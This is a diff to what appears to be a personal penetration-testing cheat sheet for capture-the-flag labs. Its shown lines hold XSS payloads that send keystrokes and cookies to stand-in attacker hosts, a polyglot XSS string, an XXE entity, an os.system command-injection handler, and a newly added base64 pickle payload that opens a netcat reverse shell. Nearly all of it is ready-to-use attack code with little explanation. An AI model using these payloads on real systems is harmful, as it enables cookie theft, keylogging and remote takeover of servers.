@@ -59,11 +59,6 @@ curl http://site.com/images/favico.ico | md5sum                                 
 <root>&read;</root>
 
 
-
-
-
-
-
 #######################         XSS          #######################################
 
 <script>alert('XSS');</script>                                                     # XSS Check
@@ -71,7 +66,9 @@ curl http://site.com/images/favico.ico | md5sum                                 
 <script>document.onkeypress = function(e) {fetch('https://hacker.srv/log?key='+btoa(e.key));}</script> # Key loggin steal
 <script>user.changeEmail('hacker@mail');</script>                                  # Use document script for xss
 <script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>     # Send users cookie to your URL
-
+<script>alert(window.location.hostname)</script>                                   # Show IP adress
+<script>alert(document.cookie)</script>                                            # Show cookie
+in console\ in <script>-tag: document.getElementById("elemid").textContent="value" # Change html page elemnt value
 
 #### Polyglot XXS ####
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
@@ -187,6 +184,16 @@ script -qc /bin/bash /dev/null
 ####################################################################################
 def rce():
   return os.system(request.args.get('cmd'))
+
+#############################cookie injection pickle base64 ##########################################
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
 
 
 ############################### Forensic ##########################################
